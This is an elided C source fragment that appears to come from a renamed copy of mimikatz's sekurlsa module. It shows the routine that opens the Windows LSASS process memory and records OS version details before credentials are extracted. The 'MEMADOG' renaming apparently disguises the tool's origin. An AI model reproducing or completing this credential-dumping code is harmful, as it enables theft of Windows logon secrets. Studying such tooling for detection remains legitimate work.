...
NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	...
	DWORD processRights = PROCESS_VM_READ | ((MEMADOG_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;
	PBYTE pSk;
			...
			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
			{
				...
				else
				{
					...
					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
						PRINT_ERROR(MEMADOG L" " MEMADOG_ARCH L" cannot access x64 process\n");
					else
				#endif
					{						
						cLsass.osContext.MajorVersion = MEMADOG_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = MEMADOG_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = MEMADOG_NT_BUILD_NUMBER;
					}
				}
